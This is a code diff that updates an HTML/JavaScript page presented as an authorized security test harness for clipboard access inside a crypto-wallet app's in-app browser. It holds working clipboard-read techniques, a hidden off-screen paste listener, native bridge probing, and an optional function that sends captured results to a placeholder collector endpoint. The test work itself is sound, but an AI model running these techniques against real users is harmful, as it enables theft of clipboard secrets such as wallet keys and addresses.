@@ -10,15 +10,20 @@
   h2 { font-size:14px; color:#9cf; margin-top:24px; }
   button { display:block; width:100%; padding:14px; margin:8px 0; font-size:15px; border:0; border-radius:8px; background:#2d6cdf; color:#fff; }
   button:active { background:#1e4fae; }
-  pre { background:#000; color:#0f0; padding:10px; border-radius:6px; white-space:pre-wrap; word-break:break-all; font-size:12px; max-height:200px; overflow:auto; }
+  button.danger { background:#c33; }
+  button.ghost { background:#333; }
+  pre { background:#000; color:#0f0; padding:10px; border-radius:6px; white-space:pre-wrap; word-break:break-all; font-size:12px; max-height:280px; overflow:auto; }
   .warn { color:#f66; font-size:12px; }
-  input[type=text] { width:100%; padding:10px; margin:6px 0; box-sizing:border-box; }
+  .ok { color:#6f6; }
+  .bad { color:#f66; }
+  .info { color:#9cf; }
+  input[type=text] { width:100%; padding:10px; margin:6px 0; box-sizing:border-box; background:#222; color:#eee; border:1px solid #444; border-radius:6px; }
   .row { display:flex; gap:8px; }
   .row button { flex:1; }
 </style>
 </head>
 <body>
- 
+
 <h1>Clipboard Access Test Harness</h1>
 <p class="warn">
   Authorized security test only. This page attempts several methods a malicious
@@ -26,17 +31,16 @@
   in-app browser. Nothing here is sent anywhere by default &mdash; exfiltration
   is opt-in via the "Collector URL" field below, for your own controlled endpoint.
 </p>
- 
+
 <h2>1. Setup</h2>
-<label>Collector URL (optional &mdash; your own logging endpoint):</label>
-<input type="text" id="collectorUrl" placeholder="https://your-collector.example/log" />
-<label>Marker string to put on the clipboard before testing (copy this manually first):</label>
-<input type="text" id="marker" value="SAUCERSWAP-CLIP-TEST-1234" readonly />
- 
+<label>Collector URL (optional &mdash; your own logging endpoint, leave blank for on-device only):</label>
+<input type="text" id="collectorUrl" placeholder="https://your-collector.example/log" value="" />
+<label>Marker string &mdash; copy this to the clipboard manually before testing:</label>
+<input type="text" id="marker" value="SAUCERSWAP-CLIP-TEST-1234" readonly onclick="this.select()" />
+
 <h2>2. Native bridge probe</h2>
-<p>Checks what the host app exposes to page JS.</p>
 <button onclick="probeBridge()">Probe window.ReactNativeWebView / injected objects</button>
- 
+
 <h2>3. Clipboard read attempts</h2>
 <div class="row">
   <button onclick="tryAsyncClipboard()">navigator.clipboard.readText()</button>
@@ -48,25 +52,44 @@
   <button onclick="tryPasteEventListener()">Focus input + wait for paste event</button>
 </div>
 <div class="row">
-  <button onclick="tryClipboardPermissionsQuery()">navigator.permissions.query({name:'clipboard-read'})</button>
+  <button onclick="tryClipboardPermissionsQuery()">navigator.permissions.query(clipboard-read)</button>
 </div>
- 
+
+<button class="ghost" onclick="runAll()">Run All Tests In Sequence</button>
+<button class="danger" onclick="clearLog()">Clear Results</button>
+
 <h2>4. Passive listener (auto-fires, no button)</h2>
 <p>A hidden focused contenteditable that logs any paste event that reaches it without user action.</p>
 <div id="pasteTarget" contenteditable="true" style="position:absolute; left:-9999px; width:1px; height:1px;"></div>
- 
+
 <h2>Results</h2>
-<pre id="out">Waiting for test actions...\n</pre>
- 
+<pre id="out"></pre>
+
 <script>
 const out = document.getElementById('out');
+
+function fmtTag(label) {
+  if (/SUCCESS|fired|granted/i.test(label)) return 'ok';
+  if (/blocked|error|denied|threw|not present/i.test(label)) return 'bad';
+  return 'info';
+}
+
 function log(label, data) {
-  const line = `[${new Date().toISOString()}] ${label}: ${typeof data === 'string' ? data : JSON.stringify(data)}\n`;
-  out.textContent += line;
+  const time = new Date().toISOString();
+  const text = typeof data === 'string' ? data : JSON.stringify(data);
+  const div = document.createElement('div');
+  div.className = fmtTag(label);
+  div.textContent = `[${time}] ${label}: ${text}`;
+  out.appendChild(div);
   out.scrollTop = out.scrollHeight;
   maybeExfiltrate(label, data);
 }
- 
+
+function clearLog() {
+  out.textContent = '';
+  log('log-cleared', 'ready');
+}
+
 function maybeExfiltrate(label, data) {
   const url = document.getElementById('collectorUrl').value.trim();
   if (!url) return;
@@ -81,27 +104,43 @@ function maybeExfiltrate(label, data) {
     log('exfil-error', String(e));
   }
 }
- 
+
+// --- Global error trapping so silent failures always show up ---
+window.addEventListener('error', (ev) => {
+  log('UNCAUGHT-ERROR', `${ev.message} @ ${ev.filename}:${ev.lineno}:${ev.colno}`);
+});
+window.addEventListener('unhandledrejection', (ev) => {
+  log('UNHANDLED-PROMISE-REJECTION', String(ev.reason));
+});
+
 // --- 2. Native bridge probe ---
 function probeBridge() {
-  const found = {};
-  ['ReactNativeWebView', 'saucerswapWallet', 'hashpack', 'ReactNativeClipboard', 'Clipboard'].forEach(k => {
-    found[k] = (typeof window[k] !== 'undefined')
-      ? Object.getOwnPropertyNames(window[k]).concat(
-          Object.getOwnPropertyNames(Object.getPrototypeOf(window[k]) || {})
-        )
-      : 'not present';
-  });
-  // Also dump anything on window that mentions "clip" case-insensitively
-  const clipboardish = Object.getOwnPropertyNames(window).filter(k => /clip/i.test(k));
-  found['window keys matching /clip/i'] = clipboardish;
-  log('bridge-probe', found);
+  log('bridge-probe-invoked', 'starting');
+  try {
+    const found = {};
+    ['ReactNativeWebView', 'saucerswapWallet', 'hashpack', 'ReactNativeClipboard', 'Clipboard'].forEach(k => {
+      if (typeof window[k] === 'undefined') {
+        found[k] = 'not present';
+        return;
+      }
+      const own = Object.getOwnPropertyNames(window[k]);
+      const proto = Object.getPrototypeOf(window[k]);
+      const protoNames = proto ? Object.getOwnPropertyNames(proto) : [];
+      found[k] = [...new Set(own.concat(protoNames))];
+    });
+    const clipboardish = Object.getOwnPropertyNames(window).filter(k => /clip|paste/i.test(k));
+    found['window keys matching /clip|paste/i'] = clipboardish;
+    log('bridge-probe-result', found);
+  } catch (e) {
+    log('bridge-probe-EXCEPTION', String(e));
+  }
 }
- 
+
 // --- 3a. Standard async Clipboard API ---
 async function tryAsyncClipboard() {
+  log('async-clipboard-invoked', 'starting');
   if (!navigator.clipboard || !navigator.clipboard.readText) {
-    log('async-clipboard', 'API not present on navigator.clipboard');
+    log('async-clipboard-unavailable', 'API not present on navigator.clipboard');
     return;
   }
   try {
@@ -111,59 +150,87 @@ async function tryAsyncClipboard() {
     log('async-clipboard-blocked', String(e));
   }
 }
- 
+
 // --- 3b. Legacy execCommand paste ---
 function tryExecCommandPaste() {
-  const target = document.getElementById('pasteTarget');
-  target.focus();
-  target.textContent = '';
-  let captured = null;
-  const handler = (ev) => {
-    try {
-      captured = (ev.clipboardData || window.clipboardData).getData('text');
-    } catch (e) {
-      captured = 'paste event fired but getData failed: ' + e;
-    }
-  };
-  target.addEventListener('paste', handler, { once: true });
-  let result;
+  log('execCommand-paste-invoked', 'starting');
   try {
-    result = document.execCommand('paste');
+    const target = document.getElementById('pasteTarget');
+    target.focus();
+    target.textContent = '';
+    let captured = null;
+    const handler = (ev) => {
+      try {
+        captured = (ev.clipboardData || window.clipboardData).getData('text');
+      } catch (e) {
+        captured = 'paste event fired but getData failed: ' + e;
+      }
+    };
+    target.addEventListener('paste', handler, { once: true });
+
+    let result;
+    try {
+      result = document.execCommand('paste');
+    } catch (e) {
+      result = 'threw: ' + e;
+    }
+
+    setTimeout(() => {
+      log('execCommand-paste-return-value', result);
+      const finalText = captured !== null ? captured : (target.textContent || '(empty / no paste event fired)');
+      log(captured !== null ? 'execCommand-paste-SUCCESS' : 'execCommand-paste-blocked', finalText);
+    }, 250);
   } catch (e) {
-    result = 'threw: ' + e;
+    log('execCommand-paste-EXCEPTION', String(e));
   }
-  setTimeout(() => {
-    log('execCommand-paste-return', result);
-    log('execCommand-paste-captured-text', captured !== null ? captured : (target.textContent || '(empty / no paste event fired)'));
-  }, 150);
 }
- 
+
 // --- 3c. Passive: focus a field and just wait, log any paste that arrives ---
 function tryPasteEventListener() {
-  const target = document.getElementById('pasteTarget');
-  target.focus();
-  log('paste-listener-armed', 'Focused hidden field. If the host auto-delivers clipboard content without any explicit read call, it will log below.');
+  log('paste-listener-armed', 'Focused hidden field. If the host auto-delivers clipboard content without any explicit read call, it will log below within a few seconds.');
+  try {
+    document.getElementById('pasteTarget').focus();
+  } catch (e) {
+    log('paste-listener-EXCEPTION', String(e));
+  }
 }
 document.getElementById('pasteTarget').addEventListener('paste', (ev) => {
   let text = '(unavailable)';
   try { text = (ev.clipboardData || window.clipboardData).getData('text'); } catch (e) {}
-  log('PASSIVE-paste-event-fired', text);
+  log('PASSIVE-paste-event-fired-SUCCESS', text);
 });
- 
+
 // --- 3d. Permissions API introspection ---
 async function tryClipboardPermissionsQuery() {
+  log('permissions-query-invoked', 'starting');
   if (!navigator.permissions || !navigator.permissions.query) {
-    log('permissions-query', 'navigator.permissions not present');
+    log('permissions-query-unavailable', 'navigator.permissions not present');
     return;
   }
   try {
     const status = await navigator.permissions.query({ name: 'clipboard-read' });
     log('permissions-query-clipboard-read', status.state);
+    status.onchange = () => log('permissions-query-clipboard-read-CHANGED', status.state);
   } catch (e) {
     log('permissions-query-error', String(e));
   }
 }
- 
+
+// --- Run everything in order with small gaps so results are easy to read ---
+async function runAll() {
+  log('run-all-started', '---');
+  probeBridge();
+  await new Promise(r => setTimeout(r, 400));
+  await tryAsyncClipboard();
+  await new Promise(r => setTimeout(r, 400));
+  tryExecCommandPaste();
+  await new Promise(r => setTimeout(r, 600));
+  tryPasteEventListener();
+  await new Promise(r => setTimeout(r, 400));
+  await tryClipboardPermissionsQuery();
+  log('run-all-finished', '---');
+}
+
 // Log basic environment info on load
 window.addEventListener('load', () => {
   log('env', {
@@ -172,9 +239,9 @@ window.addEventListener('load', () => {
     hasClipboardObj: !!navigator.clipboard,
     hasExecCommand: !!document.execCommand
   });
+  log('ready', 'Tap "Run All Tests In Sequence", or run buttons individually.');
 });
 </script>
- 
+
 </body>
 </html>
- 
